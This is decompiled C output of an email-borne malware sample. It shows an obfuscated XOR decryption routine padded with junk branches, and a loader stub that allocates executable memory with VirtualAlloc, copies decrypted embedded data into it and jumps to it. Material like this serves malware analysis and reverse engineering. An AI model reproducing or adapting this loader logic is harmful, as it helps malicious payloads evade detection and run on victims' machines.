// subject.c
// Generated on 5/4/2015 1:15:06 AM by decompiling malware_via_email/malware_0515/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

byte fn13101000(word32 ecx, word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
fn13101000_entry:
	def fp
	def dwArg10
	def dwArg0C
	def dwArg14
	def dwArg04
	def dwArg08
	def dwArg18
l13101000:
l1310100D:
	branch 0xFF3FFAF0 == 0x00000000 l1310100D
l13101013:
l1310102E:
	branch 0xFF3FFAF0 == 0x00000000 l1310102E
l13101034:
l13101050:
	branch 0xFF3FFAF0 == 0x00000000 l13101050
l13101056:
	eax_97 = dwArg10;
l13101072:
	branch 0xFF3FFAF0 == 0x00000000 l13101072
l13101078:
	ecx_131 = dwArg0C;
	dwLoc18_137 = dwArg0C;
l13101094:
	branch 0xFF3FFAF0 == 0x00000000 l13101094
l1310109A:
	ecx_153 = dwArg0C;
	*dwArg10 = dwArg0C;
l131010B5:
	branch 0xFF3FFAF0 == 0x00000000 l131010B5
l131010BB:
	eax_190 = dwArg14;
l131010D7:
	branch 0xFF3FFAF0 == 0x00000000 l131010D7
l131010DD:
	edx_222 = 0x00000000;
	edx_eax_223 = SEQ(0x00000000, dwArg14);
l131010F8:
	branch 0xFF3FFAF0 == 0x00000000 l131010F8
l131010FE:
l1310111C:
	branch 0xFF3FFAF0 == 0x00000000 l1310111C
l13101122:
	edx_285 = edx_eax_223 % 0x00000005;
	dx_287 = (word16) (edx_eax_223 % 0x00000005);
	esp_296 = fp - 0x00000018;
	fp->dwFFFFFFE8 = 0x00000005;
l1310113D:
	branch 0xFF3FFAF0 == 0x00000000 l1310113D
l13101143:
	wLoc0C_320 = dx_287;
	esp_325 = fp - 0x00000018;
	fp->dwFFFFFFE8 = 0x00000005;
l13101160:
	branch 0xFF3FFAF0 == 0x00000000 l13101160
l13101166:
	edx_350 = dwArg04;
	esp_357 = fp - 0x00000018;
	fp->dwFFFFFFE8 = 0x00000005;
l13101182:
	branch 0xFF3FFAF0 == 0x00000000 l13101182
l13101188:
	edx_381 = dwArg04 + dwArg14;
	esp_390 = fp - 0x00000018;
	fp->dwFFFFFFE8 = 0x00000005;
l131011A4:
	branch 0xFF3FFAF0 == 0x00000000 l131011A4
l131011AA:
	dwArg04_414 = edx_381;
	esp_419 = fp - 0x00000018;
	fp->dwFFFFFFE8 = 0x00000005;
l131011C6:
	branch 0xFF3FFAF0 == 0x00000000 l131011C6
l131011CC:
l131011D9:
	wLoc0C_453 = PHI(wLoc0C_320, wLoc0C_1244)
	dwArg08_454 = PHI(dwArg08, dwArg08_1311)
	dwArg04_457 = PHI(dwArg04_414, dwArg04_1404)
l131011E8:
	branch 0xFF3FFAF0 == 0x00000000 l131011E8
l131011EE:
l1310120A:
	branch 0xFF3FFAF0 == 0x00000000 l1310120A
l13101210:
l1310122C:
	branch 0xFF3FFAF0 == 0x00000000 l1310122C
l13101232:
l1310124E:
	branch 0xFF3FFAF0 == 0x00000000 l1310124E
l13101254:
	C_587 = false;
	SCZDOP_588 = false;
	dwLoc14_592.u0 = false;
l1310126F:
	branch 0xFF3FFAF0 == 0x00000000 l1310126F
l13101275:
	SCZDOP_614 = dwLoc14_592;
	Z_616 = SCZDOP_614;
	branch Z_616 l13101289
l13101284:
	goto l131015E6
l13101289:
	edx_714 = dwArg04_457;
l13101298:
	branch 0xFF3FFAF0 == 0x00000000 l13101298
l1310129E:
	al_745 = edx_714->b0000;
l131012B9:
	branch 0xFF3FFAF0 == 0x00000000 l131012B9
l131012BF:
	bLoc05_777 = al_745;
l131012DB:
	branch 0xFF3FFAF0 == 0x00000000 l131012DB
l131012E1:
	ecx_806 = (int32) wLoc0C_453;
	dwLoc18_812 = ecx_806;
l131012FE:
	branch 0xFF3FFAF0 == 0x00000000 l131012FE
l13101304:
	ecx_828 = dwLoc18_812;
	edx_836 = dwArg18;
	dwLoc18_844 = ecx_828;
l13101320:
	branch 0xFF3FFAF0 == 0x00000000 l13101320
l13101326:
	ecx_860 = dwLoc18_844;
	eax_867 = (word32) edx_836[ecx_860];
l13101343:
	branch 0xFF3FFAF0 == 0x00000000 l13101343
l13101349:
	ecx_899 = (int32) bLoc05_777;
	dwLoc18_905 = ecx_899;
l13101366:
	branch 0xFF3FFAF0 == 0x00000000 l13101366
l1310136C:
	ecx_921 = dwLoc18_905;
	ecx_928 = ecx_921 ^ eax_867;
	dwLoc18_937 = ecx_928;
l13101387:
	branch 0xFF3FFAF0 == 0x00000000 l13101387
l1310138D:
	ecx_953 = dwLoc18_937;
	cl_954 = (byte) ecx_953;
	bLoc05_961 = cl_954;
	dwLoc18_967 = ecx_953;
l131013A9:
	branch 0xFF3FFAF0 == 0x00000000 l131013A9
l131013AF:
	ecx_983 = dwLoc18_967;
	edx_990 = dwArg08_454;
	dwLoc18_998 = ecx_983;
l131013CB:
	branch 0xFF3FFAF0 == 0x00000000 l131013CB
l131013D1:
	ecx_1014 = dwLoc18_998;
	al_1021 = bLoc05_961;
	dwLoc18_1030 = ecx_1014;
l131013ED:
	branch 0xFF3FFAF0 == 0x00000000 l131013ED
l131013F3:
	ecx_1046 = dwLoc18_1030;
	edx_990->b0000 = al_1021;
	dwLoc18_1059 = ecx_1046;
l1310140E:
	branch 0xFF3FFAF0 == 0x00000000 l1310140E
l13101414:
	ecx_1075 = dwLoc18_1059;
	cx_1082 = wLoc0C_453;
	ecx_1083 = DPB(ecx_1075, cx_1082, 0, 16);
	dwLoc18_1089 = ecx_1083;
l13101431:
	branch 0xFF3FFAF0 == 0x00000000 l13101431
l13101437:
	ecx_1105 = dwLoc18_1089;
	cx_1106 = (word16) ecx_1105;
	cx_1113 = cx_1106 + 0x0001;
	ecx_1114 = DPB(ecx_1105, cx_1113, 0, 16);
	dwLoc18_1122 = ecx_1114;
l13101454:
	branch 0xFF3FFAF0 == 0x00000000 l13101454
l1310145A:
	ecx_1138 = dwLoc18_1122;
	cx_1139 = (word16) ecx_1138;
	wLoc0C_1146 = cx_1139;
l13101477:
	branch 0xFF3FFAF0 == 0x00000000 l13101477
l1310147D:
	edx_1175 = (int32) wLoc0C_1146;
l1310149A:
	branch 0xFF3FFAF0 == 0x00000000 l1310149A
l131014A0:
l131014BC:
	branch 0xFF3FFAF0 == 0x00000000 l131014BC
l131014C2:
	branch edx_1175 != 0x00000005 l13101515
l131014D1:
	eax_1439 = 0x00000000;
	ax_1442 = (word16) eax_1439;
l131014DF:
	branch 0xFF3FFAF0 == 0x00000000 l131014DF
l131014E5:
	wLoc0C_1474 = ax_1442;
l13101502:
	branch 0xFF3FFAF0 == 0x00000000 l13101502
l13101508:
l13101515:
	wLoc0C_1244 = PHI(wLoc0C_1146, wLoc0C_1474)
	ecx_1251 = dwArg08_454;
	dwLoc18_1257 = ecx_1251;
l13101524:
	branch 0xFF3FFAF0 == 0x00000000 l13101524
l1310152A:
	ecx_1273 = dwLoc18_1257;
	ecx_1280 = ecx_1273 + 0x00000001
	dwLoc18_1288 = ecx_1280;
l13101546:
	branch 0xFF3FFAF0 == 0x00000000 l13101546
l1310154C:
	ecx_1304 = dwLoc18_1288;
	dwArg08_1311 = ecx_1304;
l13101568:
	branch 0xFF3FFAF0 == 0x00000000 l13101568
l1310156E:
	edx_1340 = dwArg04_457;
l1310158A:
	branch 0xFF3FFAF0 == 0x00000000 l1310158A
l13101590:
	edx_1371 = edx_1340 + 0x00000001
l131015AC:
	branch 0xFF3FFAF0 == 0x00000000 l131015AC
l131015B2:
	dwArg04_1404 = edx_1371;
l131015CE:
	branch 0xFF3FFAF0 == 0x00000000 l131015CE
l131015D4:
	goto l131011D9
l131015E6:
	dwLoc14_627 = SCZDOP_614;
l131015F7:
	branch 0xFF3FFAF0 == 0x00000000 l131015F7
l131015FD:
	SCZDOP_647 = dwLoc14_627;
	dwLoc0C_655 = SCZDOP_647;
l13101618:
	branch 0xFF3FFAF0 == 0x00000000 l13101618
l1310161E:
	SCZDOP_675 = dwLoc0C_655;
	dwLoc08_685 = SCZDOP_675;
l13101638:
	branch 0xFF3FFAF0 == 0x00000000 l13101638
l1310163E:
	SCZDOP_705 = dwLoc08_685;
	DP_710 = SCZDOP_705;
	return DP_710
fn13101000_exit:
}

void fn13101659()
{
	code * * eax_19 = GetActiveObject(null, &globals->v0047, &globals->ptr0017);
	if (eax_19 != &globals->ptr80070057)
		Mem0[eax_19 + 0x00000000:word32]();
	word32 ecx_45 = globals->dw131022BC;
	fp->dwFFFFFD88 = &fp->dwFFFFFD88;
	fp->dwFFFFFD88 = 0x00000000;
	fp->dwFFFFFD88 = fp - 0x00000004;
	do
		;
	while (0xFF3FFAF0 == 0x00000000);
	do
		;
	while (0xFF3FFAF0 == 0x00000000);
	do
		;
	while (0xFF3FFAF0 == 0x00000000);
	do
		;
	while (0xFF3FFAF0 == 0x00000000);
	fn13101000(fp - 0x00000028, fp - 0x00000028, fp - 0x00000028, 0x00000004, fp - 0x00000010, 0x00000047, 0x00000017);
	word32 ecx_177 = globals->dw131022C0;
	fp->dwFFFFFD88 = 0x00000004;
	fp->dwFFFFFD88 = 0x00000004;
	fn13101000(&fp->dwFFFFFD88, &fp->dwFFFFFD88, &fp->dwFFFFFD88, 0x00000004, fp - 0x00000010, 0x00000047, &fp->dwFFFFFD88);
	ui32 ecx_200 = globals->dw131022C4;
	fp->dwFFFFFD88 = 0x00000008;
	fp->dwFFFFFD88 = 0x00000004;
	fn13101000(fp - 0x00000014, fp - 0x0000001C, fp - 0x00000014, 0x00000004, fp - 0x00000010, 0x00000047, &fp->dwFFFFFD88);
	word32 eax_227 = GetModuleHandleA(0x00000000);
	word32 eax_235 = globals->dw131022C8;
	fp->dwFFFFFD88 = 0x0000000C;
	fp->dwFFFFFD88 = 0x00000004;
	fn13101000(fp - 0x0000001C, fp - 0x00000028, fp - 0x0000001C, 0x00000004, fp - 0x00000010, 0x00000047, &fp->dwFFFFFD88);
	word32 dwLoc0248_269 = globals->dw131022CC;
	fp->dwFFFFFD88 = 0x00000010;
	fp->dwFFFFFD88 = 0x00000004;
	fn13101000(fp - 0x00000010, &fp->dwFFFFFD88, &fp->dwFFFFFD88, 0x00000004, fp - 0x00000010, 0x00000047, &fp->dwFFFFFD88);
	fp->dwFFFFFD88 = 0x00003000;
	fp->dwFFFFFD88 = 0x00000000;
	word32 ecx_298 = ecx_200 * 0x00000008 + 0x0000000C;
	word32 dwLoc0250_293 = 0x00000014;
	Eq_491 * dwLoc24_296 = &globals->t131022D0;
	Eq_493 * eax_311 = VirtualAlloc(0x00000004, ecx_298 + ecx_177 + ecx_45, 0x00000000, 0x00000040);
	Eq_505 * dwLoc0C_321 = eax_235 + eax_227 + ecx_298;
	word32 dwLoc0264_325 = ecx_298;
	ui32 dwLoc08_326 = 0x00000000;
	word32 dwLoc18_327 = 0x00000000;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264_325 == dwLoc0248_269)
		{
			ui32 edx_452 = dwLoc08_326 + 0x00000001;
			dwLoc08_326 = edx_452;
			if (edx_452 == ecx_200)
				goto l13101A24;
			word32 edx_461 = dwLoc24_296->dw0000;
			word32 ecx_478 = fp - 0x0000001C - dwLoc0250_293;
			fn13101000(ecx_478, ecx_478, fp - 0x0000001C, 0x00000004, fp - 0x00000010, dwLoc0250_293, &fp->dwFFFFFD88);
			Eq_548 * ecx_491 = &dwLoc24_296->t0004;
			word32 eax_488 = dwLoc0250_293 + 0x00000004;
			dwLoc0248_269 = ecx_491->dw0000;
			fn13101000(&fp->dwFFFFFD88, &fp->dwFFFFFD88 - eax_488, &fp->dwFFFFFD88, 0x00000004, fp - 0x00000010, eax_488, &fp->dwFFFFFD88);
			dwLoc0250_293 = eax_488 + 0x00000004;
			dwLoc24_296 = ecx_491 + 0x00000004;
			dwLoc0264_325 = 0x00000000;
			dwLoc0C_321 = edx_461 + eax_227;
			goto l131019DF;
		}
l131019DF:
		eax_311->b0000 = dwLoc0C_321->b0000;
		dwLoc0C_321 = dwLoc0C_321 + 1;
		dwLoc18_327 = dwLoc18_327 + 0x00000001;
		dwLoc0264_325 = dwLoc0264_325 + 0x00000001;
	}
l13101A24:
	(eax_311 + 0x00000F50)();
	return;
}

